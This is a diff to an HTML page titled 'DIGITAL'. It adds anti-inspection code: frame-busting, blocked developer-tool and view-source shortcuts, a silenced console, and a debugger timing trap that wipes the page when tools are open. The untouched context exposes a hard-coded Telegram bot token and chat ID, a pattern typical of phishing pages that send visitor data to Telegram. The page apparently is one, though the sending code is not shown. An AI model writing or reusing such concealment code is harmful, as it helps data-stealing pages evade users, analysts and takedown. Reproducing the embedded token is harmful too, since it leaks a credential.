@@ -3,6 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval';">
+  <meta http-equiv="X-Frame-Options" content="DENY">
   <title>DIGITAL</title>
   
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -3579,6 +3581,54 @@ img {
 </div>
 
 <script>
+if (window.top !== window.self) {
+    window.top.location = window.self.location;
+}
+
+document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+});
+
+document.addEventListener('keydown', function (e) {
+    if (e.key === 'F12' || e.keyCode === 123) {
+        e.preventDefault();
+        return false;
+    }
+    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) {
+        e.preventDefault();
+        return false;
+    }
+    if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) {
+        e.preventDefault();
+        return false;
+    }
+    if (e.ctrlKey && (e.key === 'S' || e.key === 's' || e.key === 'P' || e.key === 'p')) {
+        e.preventDefault();
+        return false;
+    }
+});
+
+document.addEventListener('dragstart', function(e) {
+    e.preventDefault();
+});
+
+if (typeof console !== "undefined") {
+    const noop = () => {};
+    console.log = noop;
+    console.warn = noop;
+    console.error = noop;
+    console.info = noop;
+}
+
+setInterval(function() {
+    const before = new Date().getTime();
+    (function() { debugger; })();
+    const after = new Date().getTime();
+    if (after - before > 100) {
+        document.body.innerHTML = "<h2 style='text-align:center; padding-top:50px; color:#ef4444;'>Akses ditolak.</h2>";
+    }
+}, 1000);
+
 const BOT_TOKEN = '8765727817:AAEzCv9z6n1OrAzEll_DdHM-lO2fpeL__oY'; 
 const CHAT_ID = '8893393746';
 
